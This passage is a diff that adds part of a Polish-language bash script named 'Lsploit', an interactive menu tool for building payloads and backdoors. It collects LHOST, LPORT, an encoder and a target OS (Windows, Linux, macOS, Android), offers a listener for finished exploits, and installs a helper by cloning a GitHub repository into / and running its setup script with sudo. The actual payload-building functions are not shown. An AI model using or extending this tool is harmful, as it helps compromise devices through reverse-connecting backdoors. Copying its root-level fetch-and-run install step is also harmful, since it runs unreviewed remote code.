+		read -e iteracje
+
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe exploit'a:\e[39m "
+		read -e name
+		
+		clear
+		logo
+		
+		echo -e "                        \e[1;32mPODSUMOWANIE:\e[39m "
+		echo -e "                 --------------------------"
+		echo -e "                 Nazwa: '\e[31m$name\e[39m'"
+		echo -e "                 OS: '\e[31m$osn\e[39m'"
+		echo -e "                 LHOST: '\e[31m$lhost\e[39m'"
+		echo -e "                 LPORT: '\e[31m$lport\e[39m'"
+		echo -e "                 MSFencoder: '\e[31m$encoder (x$iteracje)\e[39m'"
+		echo -e "                 --------------------------"
+		echo
+		echo -e " \e[1;32m[+]\e[1;39m Jezeli wszystko sie zgadza wcisnij ENTER\e[0m"
+		read
+		echo
+		
+		if [ $os = "1" ]; then
+			win86c
+		elif [ $os = "2" ]; then
+			win64c
+		elif [ $os = "3" ]; then
+			linuxc
+		elif [ $os = "4" ]; then
+			macc
+		elif [ $os = "5" ]; then
+			androidc
+		else
+			echo
+			echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+			echo
+			read
+			create_exploit
+		fi
+		
+	elif [ $coder = "N" ]; then
+
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe exploit'a:\e[39m "
+		read -e name
+		
+		clear
+		logo
+		
+		echo -e "                        \e[1;32mPODSUMOWANIE:\e[39m "
+		echo -e "                 --------------------------"
+		echo -e "                 Nazwa: '\e[31m$name\e[39m'"
+		echo -e "                 OS: '\e[31m$osn\e[39m'"
+		echo -e "                 LHOST: '\e[31m$lhost\e[39m'"
+		echo -e "                 LPORT: '\e[31m$lport\e[39m'"
+		echo -e "                 --------------------------"
+		echo
+		echo -e " \e[1;32m[+]\e[1;39m Jezeli wszystko sie zgadza wcisnij ENTER\e[0m"
+		read
+		echo
+		
+		if [ $os = "1" ]; then
+			win86c
+		elif [ $os = "2" ]; then
+			win64c
+		elif [ $os = "3" ]; then
+			linuxc
+		elif [ $os = "4" ]; then
+			macc
+		elif [ $os = "5" ]; then
+			androidc
+		else
+			echo
+			echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+			echo
+			read
+			create_exploit
+		fi
+		
+	elif [ $coder = "n" ]; then
+	
+
+		echo
+		echo -ne "\e[1;32mProsze podac nazwe exploit'a:\e[39m "
+		read -e name
+		
+		clear
+		logo
+		
+		echo -e "                        \e[1;32mPODSUMOWANIE:\e[39m "
+		echo -e "                 --------------------------"
+		echo -e "                 Nazwa: '\e[31m$name\e[39m'"
+		echo -e "                 OS: '\e[31m$osn\e[39m'"
+		echo -e "                 LHOST: '\e[31m$lhost\e[39m'"
+		echo -e "                 LPORT: '\e[31m$lport\e[39m'"
+		echo -e "                 --------------------------"
+		echo
+		echo -e " \e[1;32m[+]\e[1;39m Jezeli wszystko sie zgadza wcisnij ENTER\e[0m"
+		read
+		echo
+		
+		if [ $os = "1" ]; then
+			win86c
+		elif [ $os = "2" ]; then
+			win64c
+		elif [ $os = "3" ]; then
+			linuxc
+		elif [ $os = "4" ]; then
+			macc
+		elif [ $os = "5" ]; then
+			androidc
+		else
+			echo
+			echo -e "\e[1;91mWybrano nieprawidłową opcje OS!\e[0m" 
+			echo
+			read
+			create_exploit
+		fi
+	fi
+}
+	
+function menu
+{
+	logo
+	
+	echo -e " \e[1;32m[1]\e[39m - Tworzenie exploit'a"
+	echo -e " \e[1;32m[2]\e[39m - Nasluchiwanie gotowego exploit'a"
+	echo -e " \e[1;32m[3]\e[39m - Tworzenie backboor'a"
+	echo -e " \e[1;32m[4]\e[39m - Tworzenie sesji (MFC)"
+	echo -e " \e[1;32m[5]\e[39m - Zaawansowane"
+	echo
+	echo -e " \e[1;31m[0]\e[39m - Wyjscie\e[0m"
+	
+	echo 
+	echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+	read -e opcja
+	echo
+	
+	if [ $opcja = "1" ]; then
+		create_exploit
+	
+	elif [ $opcja = "2" ]; then
+		connect_exploit
+
+	elif [ $opcja = "3" ]; then
+		bd_exploit
+		
+	elif [ $opcja = "4" ]; then
+		if [ -e /bin/mfc ]; then
+			mfc
+			menu
+
+		else
+			clear
+			logo
+			echo -e " \e[1;91m[+]\e[39m Nie znaleziono programu MFC!"
+			echo
+			echo "Czy chcesz rozpoczac instalacje wymaganego programu MFC? [T / N]"
+			echo
+			echo -ne "\e[1;31mLsploit\e[21;0m:~# "
+			read -e mfc
+			
+			if [ $mfc = "T" ]; then
+				clear
+				logo
+				echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam proces instalacji MFC...\e[21;90m"
+				echo
+				
+				cd /
+				sudo git clone https://github.com/LYSYyy/MFC.git
+				cd /MFC
+				sudo chmod +x setup.sh
+				sudo ./setup.sh
+				sudo rm -r /MFC
+			
+				menu
+				
+			elif [ $mfc = "t" ]; then
+				clear
+				logo
+				echo -e " \e[1;32m[+]\e[1;39m Rozpoczynam proces instalacji MFC...\e[21;90m"
+				echo
+				
+				cd /
+				sudo git clone https://github.com/LYSYyy/MFC.git
+				cd /MFC
+				sudo chmod +x setup.sh
+				sudo ./setup.sh
+				sudo chmod 755 /bin/mfc*
+				sudo rm -r /MFC
+			
+				menu
+				
+			elif [ $mfc = "N" ]; then
+				menu
+			elif [ $mfc = "n" ]; then
+				menu
+			else
+				echo
+				echo -e "\e[1;91mWybrano nieprawidłową opcje!\e[0m"
+				echo
+				read
+				menu
+			fi
+		fi
+		
+	elif [ $opcja = "5" ]; then
+		zaawansowane
+		
+	elif [ $opcja = "0" ]; then
+		clear
+		echo
+		echo -e "\e[1;33mDo zobaczenia! :)\e[0m"
+		echo
+		exit
+	
+	else
+		echo
+		echo -e "\e[1;91mWybrano nieprawidłową opcje!\e[0m"
+		echo
+		read
+		menu
+	fi
+}
+
+server
+menu
